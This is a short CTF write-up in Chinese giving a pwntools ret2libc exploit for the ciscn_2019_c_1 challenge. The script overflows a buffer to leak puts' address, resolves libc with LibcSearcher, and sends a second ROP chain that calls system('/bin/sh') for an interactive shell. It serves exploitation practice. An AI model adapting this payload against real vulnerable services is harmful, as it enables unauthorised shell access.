---
title: ROP ciscn_2019_c_1
tags: [ctf-pwn,exp]
date: 2022-11-16 19:07:00
categories: [ctf-pwn]
excerpt: exp
---

**题目**

<https://buuoj.cn/challenges#ciscn_2019_c_1>

**Exp**

```python
from pwn import *
from LibcSearcher import *
p = process('./ciscn_2019_c_1')
# p = remote('node4.buuoj.cn',29563) 
elf = ELF('./ciscn_2019_c_1')

ret=0x4006b9
rdi=0x400c83
main=elf.sym['main']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

#第一次攻击绕过函数
p.sendlineafter(b'Input your choice!\n',b'1')
payload=b'\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendlineafter(b'Input your Plaintext to be encrypted\n',payload)
 
 
 
p.recvline()	#接收字符串Ciphertext
p.recvline()    #加密后的密文
#这里注意需要接收2次
 
puts_addr=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))  #得到 puts 函数 的地址

print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr) #获取libc的版本
offset=puts_addr-libc.dump('puts') #计算偏移量
binsh=offset+libc.dump('str_bin_sh') #计算字符串"/bin/sh"的地址
system=offset+libc.dump('system') #计算函数system的地址
 
#第二次攻击getshell
 
p.sendlineafter(b'Input your choice!\n',b'1')     #   再一次执行 一遍流程
payload=b'\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
p.sendlineafter(b'Input your Plaintext to be encrypted\n',payload)
p.interactive()



# ubuntu18版本以上调用64位程序中的system函数的栈对齐问题
# https://www.cnblogs.com/ZIKH26/articles/15996874.html
```